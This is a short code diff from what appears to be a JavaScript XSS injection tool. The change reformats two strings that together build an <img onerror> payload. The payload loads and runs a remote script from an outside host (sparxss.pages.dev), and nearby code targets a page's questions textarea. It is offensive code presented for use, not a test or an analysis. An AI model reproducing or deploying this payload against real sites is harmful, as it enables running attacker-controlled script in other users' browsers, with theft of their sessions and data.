@@ -791,16 +791,9 @@ if (typeof executed === 'undefined') {
                     link.appendChild(linkText);
                 `;
 
-                var codeBeginning = `
-                    <img src="#" onerror="var scriptElement = document.createElement('script');
-                    scriptElement.src = 'https://sparxss.pages.dev/Testing/test4.js';
-                    scriptElement.onload = function () {
-                `;
+                var codeBeginning = `<img src="#" onerror="var scriptElement = document.createElement('script'); scriptElement.src = 'https://sparxss.pages.dev/Testing/test4.js'; scriptElement.onload = function () {`;
                 
-                var codeEnd = `
-                    };
-                    document.body.appendChild(scriptElement);">
-                `;
+                var codeEnd = `}; document.body.appendChild(scriptElement);">`;
         
                 var textarea = document.querySelector('.questions-textarea');
                 
